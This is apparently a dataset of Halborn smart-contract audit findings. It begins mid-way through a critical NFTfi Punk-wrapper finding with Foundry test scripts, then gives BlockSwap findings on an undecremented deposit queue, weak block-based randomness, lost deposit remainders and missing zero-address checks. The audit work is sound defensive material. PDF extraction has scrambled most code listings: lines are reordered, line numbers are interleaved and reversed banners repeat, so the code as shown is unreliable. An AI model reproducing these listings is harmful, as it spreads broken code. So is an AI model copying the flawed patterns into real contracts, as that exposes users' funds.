); 112 113 114 115 116 117 118 119 120 121 122 123 token . transfer ( alice , 50 _000000000000000000 ); token . transfer ( bobby , 1000 _000000000000000000 ); token . transfer ( carla , 50 _000000000000000000 ); contractKeys . push ( ' PERMITTED_NFTS '); contractKeys . push ( ' PERMITTED_NFTS '); contractAddresses . push ( address ( nftContract )) ; contractAddresses . push ( address ( punkContract )) ; permittedErc20s . push ( address ( token )) ; // DEPLOYING NFTFI HUB nftFiHub = new NftfiHub ( admin , contractKeys ,  contractAddresses ); 124 125 126 address nftFiHubAddr = address ( nftFiHub ); // DEPLOYING PROMISORY NOTES AND OBLIGATION RECEPT  CONTRACTS 127 nftObligationReceipt = new SmartNft ( admin , address (  nftFiHub ) , address ( directLoanCoordinator ) , \" nftObligationReceipt \" ,  \" NOR \" , \" customURI \"); 128 nftPromissoryNote = new SmartNft ( admin , address ( nftFiHub ) ,  address ( directLoanCoordinator ) , \" nftPromissoryNote \" , \" NOR \" , \"  customURI \"); 129 nftObligationReceipt . setLoanCoordinator ( address (  directLoanCoordinator )) ; 20 G N I T S E T L A U N A M 130 nftPromissoryNote . setLoanCoordinator ( address (  directLoanCoordinator )) ; 131 132 133 // DEPLOYING DIRECT_LOAN_FIXED_OFFER_REDEPLOY directLoanFixedOfferRedeploy = new  DirectLoanFixedOfferRedeploy ( admin , nftFiHubAddr , permittedErc20s )  ; 134 address directLoanFixedOfferRedeployAddr = address (  directLoanFixedOfferRedeploy ); 135 136 137 138 139 // DEPLOYING DIRECT LOAN COORDINATOR loanTypes . push ( \" DIRECT_LOAN_FIXED_REDEPLOY \" ); loanContracts . push ( address ( directLoanFixedOfferRedeploy )); directLoanCoordinator = new DirectLoanCoordinator ( address (  nftFiHub ) , admin , loanTypes , loanContracts ); 140 141 142 // INITIALIZING DIRECT LOAN COORDINATOR directLoanCoordinator . initialize ( address ( nftPromissoryNote  ) , address ( nftObligationReceipt )) ; 143 nftObligationReceipt . setLoanCoordinator ( address (  directLoanCoordinator )) ; 144 nftPromissoryNote . setLoanCoordinator ( address (  directLoanCoordinator )) ; 145 146 147 148 149 // SETTING CONTRACTKEYS AND CONTRACTADDRRESSES contractKeys . push ( ' DIRECT_LOAN_COORDINATOR '); contractAddresses . push ( address ( directLoanCoordinator )) ; nftFiHub . setContract ( ' DIRECT_LOAN_COORDINATOR ' , address (  directLoanCoordinator )) ; 150 151 152 153 154 155 156 157 158 159 160 // REGISTRATION OF PERMITTED NFTS AND TYPES definedNftTypes . push ( ' NFT '); definedNftTypes . push ( ' PUNKS '); definedNftWrappers . push ( address ( nftWrapper )) ; definedNftWrappers . push ( address ( punkWrapper )) ; permittedNftContracts . push ( address ( nftContract )) ; permittedNftContracts . push ( address ( punkContract )) ; permittedNftTypes . push ( ' NFT '); permittedNftTypes . push ( ' PUNKS '); permittedNFTsAndTypeRegistry = new  PermittedNFTsAndTypeRegistry ( admin , nftFiHubAddr , definedNftTypes ,  definedNftWrappers , permittedNftContracts , permittedNftTypes ); 161 162 vm . stopPrank () ; 21 G N I T S E T L A U N A M 163 164  )); 165 166 // PERMITTED AIRDROPS SETTINGS selectors . push ( bytes4 ( keccak256 ( bytes ( \" mintNFT ( uint256 ) \")) airdopContracts . push ( address ( nftContract )) ; permittedAirdrop = new PermittedAirdrops ( admin ,  airdopContracts , selectors ); 167 168 169 170 // AIRDROP RECEIVER ( alt 2) vm . startPrank ( admin ); airdropReceiverFactory = new AirdropReceiverFactory (  address ( admin ) , address ( nftFiHub )); 171 airdropReceiverToClone = new AirdropReceiver ( address (  nftFiHub )); 172 permittedNFTsAndTypeRegistry . setNftType ( ' AirdropWrapper ',  address ( airdropReceiverToClone )) ; 173 174 175  ); 176 177 // SETTING CONTRACTS AND PERMISIONS permittedNftContracts . push ( address ( airdropReceiverToClone ) permittedNftTypes . push ( ' AIRDROP_RECEIVER '); nftFiHub . setContract ( ' AIRDROP_RECEIVER ', address (  airdropReceiverToClone )) ; 178 nftFiHub . setContract ( ' AIRDROP_FACTORY ' , address (  airdropReceiverFactory )) ; 179 nftFiHub . setContract ( ' PERMITTED_NFTS ' , address (  permittedNFTsAndTypeRegistry )) ; 180 nftFiHub . setContract ( ' PERMITTED_AIRDROPS ' , address (  permittedAirdrop )); 181 182 183 184 185 } // time update timeNow = block . timestamp ; vm . stopPrank () ; The following internal functions have been used for the complete execution of the tests: Listing 4: PunkTest.t.sol function getBobbyOfferSignature () internal returns ( LoanData . 1  Signature memory ) { 2 3 // DECLARING OFFER 22 G N I T S E T L A U N A M LoanData . Offer memory offer = declareOffer () ; // PREPARING SIGNATURE STRUCT LoanData . Signature memory signature = LoanData . Signature ({ } }) ; id := chainid () // GETTING THE MESSAGE HASH bytes32 message = keccak256 ( // GETTING CHAIN ID uint256 id ; assembly { nonce : 0, expiry : timeNow + 10 days , signer : bobby , signature : hex \"1 c \" 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  getEncodedSignature ( signature ) , address (  directLoanFixedOfferRedeploy ) , id ) 23 24 25 26  message ); 27 28 29  signedMessage ); 30 31 32 33 34 35  ({ 36 37 38 39 40 41 42 nonce : 0, expiry : timeNow + 10 days , signer : bobby , signature : signaturesf return signaturefi ; }) ; ); abi . encodePacked ( getEncodedOffer ( offer ) , // EIP712 STANDARD bytes32 signedMessage = ECDSA . toEthSignedMessageHash ( // GETTING THE V , R , S OF THE SIGNED MESSAGE ( uint8 v , bytes32 r , bytes32 s) = vm . sign (0 xB0BB1 , bytes memory v_bytes ; if ( v == 27) { v_bytes = hex \" 1 b\" ;} else { v_bytes = hex \" 1c \" ;} bytes memory signaturesf = bytes . concat (r , s , v_bytes ); // BOBBY SIGNES LoanData . Signature memory signaturefi = LoanData . Signature 23 G N I T S E T L A U N A M } } }) ; return offer ; function declareOffer () internal returns ( LoanData . Offer // DECLARING OFFER LoanData . Offer memory offer = LoanData . Offer ({ loanPrincipalAmount : 10 _000000000000000000 , maximumRepaymentAmount : 12 _000000000000000000 , nftCollateralId : 0, nftCollateralContract : address ( punkContract ) , loanDuration : 10 days , loanAdminFeeInBasisPoints : 500 , loanERC20Denomination : address ( token ) , referrer : zeroo 43 44 45  memory ) { 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 function getBalances ( uint32 loanId ) internal { 62 ( uint256 loanPrincipalAmount , uint256 63  maximumRepaymentAmount , uint256 nftCollateralId , address  loanERC20Denomination , uint32 loanDuration , uint32  loanInterestRateForDuration , uint16 loanAdminFeeInBasisPoints ,  address nftCollateralWrapper , uint64 loanStartTime , address  nftCollateralContract , address borrower ) =  directLoanFixedOfferRedeploy . loanIdToLoan ( loanId ); liquidated = directLoanFixedOfferRedeploy . 64  loanRepaidOrLiquidated ( loanId ); 65 66 67  balanceOf ( admin )); 68  balanceOf ( alice )); 69  balanceOf ( bobby )); 70  balanceOf ( carla )); 71  punkIndexToAddress (0) ) ; 72 73 console . log ( \" \" ); console . log ( \" ****** LOAN DATA ****** \" ); console . log ( \" ****** BALANCES ****** \"); console . log ( \" Balance Of Admin console . log ( \" Owner of the NFT console . log ( \" Balance Of Carla console . log ( \" Balance Of Bobby console . log ( \" Balance Of Alice ---> \" , token . ---> \" , token . ---> \" , token . ---> \" , token . ---> \" , punkContract . 24 G N I T S E T L A U N A M ---> \" , ---> \" , ---> \" , ---> \" , ---> \" , ---> \" , ---> \" , ---> \" , ---> \" , ---> \" , console . log ( \" loanDuration console . log ( \" loanStartTime console . log ( \" nftCollateralId console . log ( \" loanPrincipalAmount console . log ( \" nftCollateralWrapper console . log ( \" loanERC20Denomination console . log ( \" nftCollateralContract console . log ( \" maximumRepaymentAmount console . log ( \" interestRateForDuration console . log ( \" loanAdminFeeInBasisPoints console . log ( \" borrower console . log ( \" LOAN LIQUIDATED / REPAYED 74  loanPrincipalAmount ); 75  maximumRepaymentAmount ); 76  nftCollateralId ); 77  loanERC20Denomination ); 78  loanDuration ); 79  loanInterestRateForDuration ); 80  loanAdminFeeInBasisPoints ); 81  nftCollateralWrapper ); 82  loanStartTime ); 83  nftCollateralContract ); 84 85  ); 86 87 88 89  _signature ) internal pure returns ( bytes memory ) { 90  nonce , _signature . expiry ); 91 92 93  internal pure returns ( bytes memory ) { 94 95 96 97 98 99 100 101 102 103 _offer . loanERC20Denomination , _offer . loanPrincipalAmount , _offer . maximumRepaymentAmount , _offer . nftCollateralContract , _offer . nftCollateralId , _offer . referrer , _offer . loanDuration , _offer . loanAdminFeeInBasisPoints abi . encodePacked ( console . log ( \" \" ); return } } function getEncodedOffer ( LoanData . Offer memory _offer ) function getEncodedSignature ( LoanData . Signature memory return abi . encodePacked ( _signature . signer , _signature . ---> \" , borrower ); ---> \" , liquidated 25 G N I T S E T L A U N A M ); 104 105 106 } 107 } G N I T S E T L A U N A M 26 TEST 1: Script Listing 5: NFTFi.t.sol 174 175 176 177 178 179 180 181 182 function test_1 () public { // INITIAL STATE LOGS console . log ( \" ****** STATE 0 ( ENV ) ******* \"); console . log ( \" \" ); getBalances () ; vm . prank ( alice ); punkContract . offerPunkForSaleToAddress (0 , 0 , address (  directLoanFixedOfferRedeploy )) ; 183 184 185 186 // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10  _000000000000000000 ); 187 188 189 190 // PREPARING SINGNATURE LoanData . Offer memory offer = declareOffer () ; LoanData . Signature memory signaturefi =  getBobbyOfferSignature () ; 191 192 193 194 195 // ALICE ACCEPTS BOBBY 'S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer ,  signaturefi , borrowerSettings ); 196 197 198 199 200 201 202 203 204 205 206 207 208 209 G N I T S E T L A U N A M // LOGS console . log ( \" ****** STATE 1 ******* \"); console . log ( \" TX : ALICE ---> ACCEPT BOBBY 'S OFFER \" ); console . log ( \" \" ); getBalances (1) ; // 5 DAYS LATER console . log ( \" ---------------\" ); console . log ( \"5 DAYS LATER ... \" ); console . log ( \" ---------------\" ); console . log ( \" \" ); vm . warp (5 days ); 27 210 211 212 // ALICE PAY THE MONEY vm . prank ( alice ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 12  _000000000000000000 ); 213 214 215 216 217 218 219 220 221 } vm . prank ( alice ); directLoanFixedOfferRedeploy . payBackLoan (1) ; // LOGS console . log ( \" ****** STATE 2 ******* \"); console . log ( \" TX : ALICE ---> PAY BACK LOAN \"); console . log ( \" \" ); getBalances (1) ; G N I T S E T L A U N A M 28 Output G N I T S E T L A U N A M 29 TEST 1.1: Script Listing 6 // INITIAL STATE LOGS console . log (\"****** STATE 0 ( ENV ) *******\") ; console . log (\" \") ; getBalances () ; vm . prank ( alice ); punkContract . offerPunkForSaleToAddress (0 , 0 , address ( // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10 1 function test_13 () public { 2 3 4 5 6 7 8 9  directLoanFixedOfferRedeploy )) ; 10 11 12 13  _000000000000000000 ); 14 15 16 17  getBobbyOfferSignature () ; 18 19 20 21 22  signaturefi , borrowerSettings ); 23 24 25 26 27 28 29 30 31 32 33 34 35 36 // ALICE PAY THE MONEY // PREPARING SINGNATURE LoanData . Offer memory offer = declareOffer () ; LoanData . Signature memory signaturefi = // ALICE ACCEPTS BOBBY ' S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer , // LOGS console . log (\"****** STATE 1 *******\") ; console . log (\" TX : ALICE ---> ACCEPT BOBBY ' S OFFER \") ; console . log (\" \") ; getBalances (1) ; // 5 DAYS LATER console . log (\" - - - - - - - - - - - - - - -\") ; console . log (\"5 DAYS LATER ...\") ; console . log (\" - - - - - - - - - - - - - - -\") ; vm . warp (5 days ); G N I T S E T L A U N A M 30 vm . prank ( carla ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 12 37 38  _000000000000000000 ); 39 40 41 42 43 44 45 46 47 48 49 } vm . prank ( carla ); directLoanFixedOfferRedeploy . payBackLoan (1) ; // LOGS console . log (\"****** STATE 2 *******\") ; console . log (\" TX : CARLA ---> PAY BACK LOAN \") ; conso", "labels": ["Halborn", "NFTfi_Native_Punk_Wrapper", "Severity: Critical"]}, {"title": "MAPPING IS NOT DECREASED AFTER A DEPOSIT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BlockSwap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract BalanceReporter, the following function is defined: Listing 1: BalanceReporter.sol (Lines 272) address _stakeHouse , bytes calldata _blsPublicKey , uint256 _amount 252 function _addTopUpToQueue ( 253 254 255 256 ) internal { 257 258 stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ] += _amount ; stakeHouseTotalDepositedForMembers [ _stakeHouse ][ _blsPublicKey ] += _amount ; if ( stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ] >= 1 ether ) { uint256 depositAmount = stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ]; // Deposit amount sent to the deposit contract must be a multiple of 1 gwei so adjust deposit amount accordingly depositAmount -= depositAmount % 1 gwei ; bytes memory _blsSignature = universe . accountManager () . getSignatureByBLSKey ( _blsPublicKey ); // / Deposit amount is divided by 1 gwei , because Deposit contract only tracks the balance up to 1 gwei precision bytes32 leaf = ETH2Validation . getDepositDataRoot ( _blsPublicKey , _blsSignature , WITHDRAWAL_CREDENTIALS , depositAmount / 1 gwei ); // / Send deposit topup to the contract DepositContract . deposit { value : depositAmount }( _blsPublicKey , WITHDRAWAL_CREDENTIALS , _blsSignature , leaf ); 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 15 274 emit FundsSentToDepositContract ( _stakeHouse , _blsPublicKey , depositAmount ); } emit ETHQueueDeposit ( _stakeHouse , _blsPublicKey , _amount ); 275 276 277 278 } The function _addTopUpToQueue makes use of the following mapping: stakeHouseMemberQueue[_stakeHouse][_blsPublicKey] the amount of Ether that should be sent to the Deposit Contract: calculate to Listing 2: BalanceReporter.sol 24 // / @notice StakeHouse -> Member ID ( Validator pub key ) -> ETH queued to be sent to the deposit contract 25 mapping ( address => mapping ( bytes => uint256 )) public stakeHouseMemberQueue ; As we can see, depositAmount}(_blsPublicKey, WITHDRAWAL_CREDENTIALS, _blsSignature, leaf); the mapping amount is not decreased. This means that: after the call to DepositContract.deposit{value: 1. In the second call to _addTopUpToQueue the function will try to deposit a wrong amount of Ether into the Deposit Contract. 2. The contract will not have enough funds to be sent to the Deposit Contract causing any call to _addTopUpToQueue to revert. Hence, noone will be able to use the functions slashAndBuySlot and buySlashedSlot. Risk Level: Likelihood - 5 Impact - 4 16 Recommendation: stakeHouseMemberQueue should be decreased after the DepositContract. deposit call by exactly the amount sent to the Deposit Contract. Remediation Plan: SOLVED: The BalanceReporter.sol contract now correctly decreases the stakeHouseMemberQueue mapping as suggested: Listing 3: BalanceReporter.sol (Lines 274) address _stakeHouse , bytes calldata _blsPublicKey , uint256 _amount 254 function _addTopUpToQueue ( 255 256 257 258 ) internal { 259 260 stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ] += _amount ; stakeHouseTotalDepositedForMembers [ _stakeHouse ][ _blsPublicKey ] 261 262 263 264 265 266 267 268 269 270 271 272 273 274 += _amount ; if ( stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ] >= 1 ether ) { uint256 depositAmount = stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ]; // Deposit amount sent to the deposit contract must be a multiple of 1 gwei so adjust deposit amount accordingly depositAmount -= depositAmount % 1 gwei ; bytes memory _blsSignature = universe . accountManager () . getSignatureByBLSKey ( _blsPublicKey ); // / Deposit amount is divided by 1 gwei , because Deposit contract only tracks the balance up to 1 gwei precision bytes32 leaf = ETH2Validation . getDepositDataRoot ( _blsPublicKey , _blsSignature , WITHDRAWAL_CREDENTIALS , depositAmount / 1 gwei ); // Adjust the member queue by the amount of value being sent to the deposit contract stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ] -= depositAmount ; 17 275 276 277 278 279 280 281 282 283 } // / Send deposit topup to the contract DepositContract . deposit { value : depositAmount }( _blsPublicKey , WITHDRAWAL_CREDENTIALS , _blsSignature , leaf ); emit FundsSentToDepositContract ( _stakeHouse , _blsPublicKey , depositAmount ); } emit ETHQueueDeposit ( _stakeHouse , _blsPublicKey , _amount ); 18 ", "labels": ["Halborn", "BlockSwap", "Severity: High"]}, {"title": "WEAK PRNG IN SKLOOTFACTORY CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BlockSwap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract skLootFactory, the following function is defined: Listing 4: skLootFactory.sol (Lines 265) 253 function skLootItemClaim ( 254 255 256 257 ) external { 258 address _stakeHouse , address _recipient , uint256 _brandTokenId require ( msg . sender == address ( brandCentral ) , \" Only brand central \" ); // Source of entropy uint256 numberOfKnotsInHouse = StakeHouseRegistry ( _stakeHouse ) . numberOfMemberKNOTs () ; uint256 numberOfHouseKnotInUniverse = brandCentral . universe () . numberOfStakeHouses () ; uint256 totalKnotsInUniverse = numberOfKnotsInHouse + numberOfHouseKnotInUniverse ; bool isSpecial = _blockNumber () % 50 == 0; // Generate a pseudo random number using above and blockchain entropy // in theory , miners dont manipulate basefee as that is burnt - EIP1559 uint256 pseudoRandomNumber = uint256 ( keccak256 ( abi . encodePacked ( block . difficulty , block . timestamp , block . basefee , numberOfKnotsInHouse , numberOfHouseKnotInUniverse , isSpecial , totalKnotsInUniverse ))); 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 19 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 } // pluck an item depending on whether its special or knot :) string memory pickedItem ; if ( isSpecial ) { string [6] memory _specialLuckyDipGems = specialLuckyDipGems () ; pickedItem = _specialLuckyDipGems [ pseudoRandomNumber % _specialLuckyDipGems . length ]; } else { string [8] memory _luckyDipItems = luckyDipItems () ; pickedItem = _luckyDipItems [ pseudoRandomNumber % _luckyDipItems . length ]; } // mint the token uint256 tokenId = skLoot . mint ( pickedItem , skLOOT . ItemType . sItem , _brandTokenId , _recipient ); emit skLootItemClaimedForKnot ( tokenId ); This function allows anyone to claim a skLoot item from the open pool when a new member is added to any StakeHouse. The item given is from a lucky dip list where special draws can be made from a rare gem list. As we can see in case that block.number % 50 == 0 the item will be a very rare gem. As it is true that it is not possible to force a transaction in a specific block.number users that are aware of this implementation will definitely try to do the call in a block.number multiple of 50 in order to acquire a gem. Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to increase the complexity of how isSpecial value is calculated and not make it dependant on just the block.number. The best 20 approach would be using Chainlink VRF to generate a random number and based on that number decide if the item given will be special or not. Remediation Plan: SOLVED: The BlockSwap team increased the complexity of how isSpecial value is calculated and it is not dependant only on just the block.number anymore. It is worth mentioning that still this is not totally random as the smart contract does not make use of ChainLink VRF. 21 ", "labels": ["Halborn", "BlockSwap", "Severity: Low"]}, {"title": "LOST ADJUSTED DEPOSIT AMOUNT DIFFERENCE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BlockSwap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract BalanceReporter the following function _addTopUpToQueue is defined: Listing 5: BalanceReporter.sol (Lines 264) address _stakeHouse , bytes calldata _blsPublicKey , uint256 _amount 252 function _addTopUpToQueue ( 253 254 255 256 ) internal { 257 258 stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ] += _amount ; stakeHouseTotalDepositedForMembers [ _stakeHouse ][ _blsPublicKey ] += _amount ; if ( stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ] >= 1 ether ) { uint256 depositAmount = stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ]; // Deposit amount sent to the deposit contract must be a multiple of 1 gwei so adjust deposit amount accordingly depositAmount -= depositAmount % 1 gwei ; bytes memory _blsSignature = universe . accountManager () . getSignatureByBLSKey ( _blsPublicKey ); // / Deposit amount is divided by 1 gwei , because Deposit contract only tracks the balance up to 1 gwei precision bytes32 leaf = ETH2Validation . getDepositDataRoot ( _blsPublicKey , _blsSignature , WITHDRAWAL_CREDENTIALS , depositAmount / 1 gwei ); // / Send deposit topup to the contract DepositContract . deposit { value : depositAmount }( _blsPublicKey , WITHDRAWAL_CREDENTIALS , _blsSignature , leaf ); 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 22 274 emit FundsSentToDepositContract ( _stakeHouse , _blsPublicKey , depositAmount ); } emit ETHQueueDeposit ( _stakeHouse , _blsPublicKey , _amount ); 275 276 277 278 } As we can see in the comments, the deposit amount sent to the Deposit Contract must be a multiple of 1 GWEI so the deposit amount is adjusted accordingly. Although, in this case, the difference from the msg.value sent by the user and the amount sent to the Deposit Contract will remain in the BalanceReporter/TransactionManager contract and will be lost by the user. Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended to send the remaining amount back to the user or directly not allowing the user to use a msg.value that is not multiple of 1 GWEI. Remediation Plan: SOLVED: The BlockSwap team added a require statement that checks now that the amount sent by the user is multiple of 1 GWEI. 23 ", "labels": ["Halborn", "BlockSwap", "Severity: Low"]}, {"title": "FUNCTION NOT EXPOSED IN TRANSACTIONMANAGER CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BlockSwap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract AccountManager the following function is defined: Listing 6: AccountManager.sol (Lines 203) address _rageQuitter , bytes calldata _blsPublicKey , address _stakeHouse , uint256 _amountOfETHInDepositQueue , ETH2Validation . ETH2DataReport calldata _report 197 function rageQuitKnot ( 198 199 200 201 202 203 ) external override onlyModule { 204 205 // / Perform the critical checks before exiting the stakehouse _performStakeHousePreFlightChecks ( _rageQuitter , _blsPublicKey ) ; // / Set user lifecycle status to exited _setLifecycleStatus ( _blsPublicKey , uint256 ( LifecycleStatus . EXITED )); blsPublicKeyToLastState [ _blsPublicKey ] = _report ; // / Initialize the rage quit of the Knot universe . rageQuitKnot ( _stakeHouse , _blsPublicKey , _rageQuitter , _amountOfETHInDepositQueue ); 206 207 208 209 210 211 212 213 214 215 216 217 218 219 } The function contains the onlyModule modifier, which means that it can only be called by some other module although the call is not implemented anywhere: 24 This does not occur with other functions in the AccountManager manager contract, as can be seen below: Hence, TransactionManager contract as it is done with the other functions. rageQuitKnot function exposed should the be in the Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to expose the function AccountManager.rageQuitKnot in the TransactionManager contract as it is done with the rest of the functions of AccountManager. Remediation Plan: SOLVED: TransactionManager contract: BlockSwap team The implemented the function in the Listing 7: TransactionManager.sol (Lines 134) 124 function rageQuit ( 125 126 127 128 bytes calldata _blsPublicKey , address _stakehouse , ETH2Validation . ETH2DataReport calldata _eth2Report , ETH2Validation . ETH2DataReportSignature calldata _reportSignature 129 ) external override onlyValidStakeHouse ( _stakehouse ) { 25 130 131 132 133 134 135 136 137 138 require ( _isReportSignatureValid ( _blsPublicKey , _eth2Report , _reportSignature ) , ' Report signature invalid '); _performETH2DataCheckRageQuit ( _blsPublicKey , _eth2Report ); accountManager . rageQuitKnot ( msg . sender , _blsPublicKey , _stakehouse , 0, // As the KNOT was never active , there will be no funds in queue for top up if it is exiting _eth2Report 139 140 141 } ); 26 ", "labels": ["Halborn", "BlockSwap", "Severity: Low"]}, {"title": "LACK OF ZERO ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BlockSwap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Checking addresses against zero-address during initialization is a security best-practice. However, such checks are missing in multiple constructors. Allowing zero-addresses can lead to contract reverts and force redeployment if there are no setters for such address variables. Code Location: savETHManager.sol Listing 8: savETHManager.sol 14 function init ( StakeHouseUniverse _universe ) external initializer { 15 16 } universe = _universe ; savETHReservePool.sol Listing 9: savETHReservePool.sol 54 function init ( StakeHouseUniverse _universe , address _saveETHLogic ) external initializer { dETHToken = new dETH ( address ( this )) ; StakeHouseUpgradeableProxy saveETHProxy = new StakeHouseUpgradeableProxy ( _saveETHLogic , address ( _universe ) , abi . encodeWithSelector ( savETH ( _saveETHLogic ). init . selector , address ( this ) ) ); saveETHToken = savETH ( address ( saveETHProxy )); 55 56 57 58 59 60 61 62 63 64 65 66 27 67 68 69 } __initModuleGuards ( _universe ); sETH.sol Listing 10: sETH.sol 21 function init ( SlotSettlementPool _slotSettlementPool , address _stakeHouse ) external initializer { slotSettlementPool = _slotSettlementPool ; stakeHouse = _stakeHouse ; __ERC20_init ( \" sETH \" , \" sETH \" ); __ERC20Permit_init ( \" sETH \" ); 22 23 24 25 26 27 28 29 30 31 } SlotSettlementPool.sol Listing 11: SlotSettlementPool.sol __initModuleGuards ( _universe ); StakeHouseUniverse _universe , address _sETHBeacon 50 function init ( 51 52 53 ) external initializer { 54 55 56 57 58 59 } sETHBeacon = _sETHBeacon ; slot = new SlotToken ( address ( this )) ; 28 SlotToken.sol Listing 12: SlotToken.sol 13 constructor ( address _slotSettlementPool ) { 14 15 } slotSettlementPool = _slotSettlementPool ; BrandCentral.sol Listing 13: BrandCentral.sol StakeHouseUniverse _universe , BrandNFT _brandNFT , skLOOTFactory _skLootFactory , BrandCentralClaimAuction _claimAuction 54 function init ( 55 56 57 58 59 ) external initializer { 60 61 62 63 64 65 } __initModuleGuards ( _universe ); brandNFT = _brandNFT ; skLootFactory = _skLootFactory ; claimAuction = _claimAuction ; BrandCentralClaimAuction.sol Listing 14: BrandCentralClaimAuction.sol 13 constructor ( uint256 _startBlock , IERC20 _shbToken ) { 14 15 16 17 18 19 20 21 22 23 24 25 26 isRestrictedBrandTicker [ \" bsn \"] = true ; isRestrictedBrandTicker [ \" cbsn \" ] = true ; isRestrictedBrandTicker [ \" dart \" ] = true ; isRestrictedBrandTicker [ \" saver \" ] = true ; isRestrictedBrandTicker [ \" stake \" ] = true ; isRestrictedBrandTicker [ \" house \" ] = true ; isRestrictedBrandTicker [ \" poly \" ] = true ; isRestrictedBrandTicker [ \" wolf \" ] = true ; isRestrictedBrandTicker [ \" elevt \" ] = true ; isRestrictedBrandTicker [ \" mynt \" ] = true ; isRestrictedBrandTicker [ \" club \" ] = true ; isRestrictedBrandTicker [ \" impfi \" ] = true ; isRestrictedBrandTicker [ \" colab \" ] = true ; 29 isRestrictedBrandTicker [ \" cland \" ] = true ; startBlock = _startBlock ; // auto calculate end block endBlock = startBlock + TOTAL_AUCTION_LENGTH_IN_BLOCKS ; shbToken = _shbToken ; emit Deployed () ; 27 28 29 30 31 32 33 34 35 36 37 } BrandNFT.sol Listing 15: BrandNFT.sol brandCentral = BrandCentral ( _brandCentral ); 47 function init ( address _brandCentral ) external initializer { 48 49 50 51 } __ERC721_init ( \" StakeHouseBrand \" , \" SHNFT \"); skLOOT.sol Listing 16: skLOOT.sol lootFactory = _lootFactory ; 13 function init ( skLOOTFactory _lootFactory ) external initializer { 14 15 16 17 } __ERC721_init ( \" skLoot \" , \" skLoot \"); skLOOTFactory.sol Listing 17: skLOOTFactory.sol 128 function init ( BrandCentral _brandCentral , address _skLootLogic ) external initializer { brandCentral = _brandCentral ; __ERC721_init ( \" skLootBag \" , \" skLootBag \" ); 129 130 131 30 132 133 134 135 136 137 138 139 140 141 142 143 } StakeHouseUpgradeableProxy skLootProxy = new StakeHouseUpgradeableProxy ( _skLootLogic , address ( brandCentral . universe () ) , abi . encodeWithSelector ( skLOOT ( _skLootLogic ). init . selector , address ( this ) ) ); skLoot = skLOOT ( address ( skLootProxy )) ; StakeHouseUpgradeableProxy.sol Listing 18: StakeHouseUpgradeableProxy.sol 34 constructor ( address _logic , address universe_ , bytes memory _data ) payable ERC1967Proxy ( _logic , _data ) { _setUniverse ( universe_ ); 35 36 } UniverseUpgradeableProxy.sol Listing 19: UniverseUpgradeableProxy.sol 34 constructor ( address _logic , address accessControls_ , bytes memory _data ) payable ERC1967Proxy ( _logic , _data ) { _setAccessControls ( accessControls_ ); 35 36 } StakeHouseAccessControls.sol Listing 20: StakeHouseAccessControls.sol 37 constructor ( address _superAdmin ) { 38 39 _setRoleAdmin ( CORE_MODULE_ADMIN_ROLE , CORE_MODULE_ADMIN_ROLE ); _setRoleAdmin ( CORE_MODULE_MANAGER_ROLE , CORE_MODULE_ADMIN_ROLE ); 40 _setRoleAdmin ( CORE_MODULE_ROLE , CORE_MODULE_MANAGER_ROLE ); 31 41 42 43 44 45 } _setupRole ( DEFAULT_ADMIN_ROLE , _superAdmin ); _setupRole ( CORE_MODULE_ADMIN_ROLE , _superAdmin ); _setupRole ( CORE_MODULE_MANAGER_ROLE , _superAdmin ); StakeHouseUniverse.sol Listing 21: StakeHouseUniverse.sol StakeHouseAccessControls _accessControls , address _settlementPoolLogic , address _sETHBeacon , address _saveETHReservePoolLogic , address _saveETHLogic , address _stakeHouseRegistryBeacon , address _accountManagerLogic , address _transactionManagerLogic , address _depositRouter , uint256 _minDataEpochHeight 76 function init ( 77 78 79 80 81 82 83 84 85 86 87 ) external initializer { 88 89 { require ( _accessControls . isAdmin ( msg . sender ) , \" Only admin \" ) ; require ( _sETHBeacon != address (0) , \" sETH beacon cannot be zero address \" ); require ( _stakeHouseRegistryBeacon != address (0) , \" Registry beacon cannot be zero address \"); } accessControls = _accessControls ; StakeHouseUpgradeableProxy accountManagerProxy = new StakeHouseUpgradeableProxy ( _accountManagerLogic , address ( this ) , abi . encodeWithSelector ( AccountManager ( _accountManagerLogic ). init . selector , address ( this ) ) ); 